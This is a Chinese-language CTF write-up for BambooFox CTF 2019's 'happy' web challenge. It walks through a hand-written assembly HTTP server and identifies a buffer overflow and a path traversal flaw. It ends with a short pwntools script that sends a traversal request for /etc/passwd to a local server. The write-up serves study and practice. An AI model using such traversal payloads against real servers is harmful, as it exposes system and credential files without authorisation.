BamboofoxCTF 2019 - [web] happy
===
- [Description](#Description)
    - [Vulnerability](#Vulnerability)
- [Reference](#Reference)

# Description
這題隊友 [Frank Lin](https://github.com/eee4017) 搞出了一包 `server.zip`，裡面是這台 server 的 code，用組語寫的就是潮

## Vulnerability
```asm
read_req_path:

    enter 1000, 0

read_req_path_start:

    mov rax, 0          ; sys_read
    mov rdi, [sockfd]   ; read from client
    lea rsi, [rbp-1000]   ; store in req_path
    mov rdx, 1024       ; read only 1 line (<=1 KB)
    syscall             ; Buffer Overflow?
    
    cmp rax, 0          ; handle EOF
    je read_req_path_exception

    mov rdi, req_GET    ; "GET" in memory
    lea rsi, [rbp-1000]
    mov rdx, 4          ; compare 4 chars
    call strncmp
    cmp rax, 0          ; read again if not match
    jne read_req_path_start ; 前面可以塞垃圾再 GET

    mov byte [req_path], '.' ; prefix . ; 0x600a95

    ; 先直接將 GET 之後的 128 bytes 拿到 req_path
    mov rcx, 127        ; mov 128 bytes path to req_path
    lea rsi, [rbp-1000+4] ; skip "GET "
    mov rdi, req_path+1 ; skip .
    rep movsb

    ; 再用空白截斷路徑
    mov rcx, 127        ; max 127 bytes
    mov al, 32          ; space
    mov rdi, req_path
    repne scasb

    mov rdx, 126
    xchg rcx, rdx
    sub rcx, rdx        ; rcx is path length

    mov byte [rcx+req_path], 0  ; append null

    mov rax, 0          ; return success
    leave
    ret
```

- 第一個 syscall 存在 buffer overflow
- 這裡的邏輯處理完後，req_path 會長這樣
    - `'.'` + `'GET '`之後的 128 bytes 字串(第一個空格之後的字元會變成 null byte)

然後 call 這個
```asm
open_req_file:
    mov rax, 2          ; sys_open
    mov rdi, req_path   ; skip '/' <- root
    mov rsi, 0          ; O_RDONLY (read only)
    syscall
    mov [file_fd], rax  ; save file descriptor to file_fd
    ret
```

oh wow 任意讀檔案

剩下就看 exploit ㄅ

注意 payload 最後的空格是必要的

不然就變成讀 `../../../../../../../../../../../../etc/passwd\r\nblablabla`，而這檔案很明顯不存在
```python
#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

p = process('./server.out')
r = remote('localhost', 8888)

payload = b'GET ./../../../../../../../../../../../etc/passwd \r\n'

r.send(payload)

r.interactive()
p.close()
```


# Reference
NULL

###### tags: `CTF`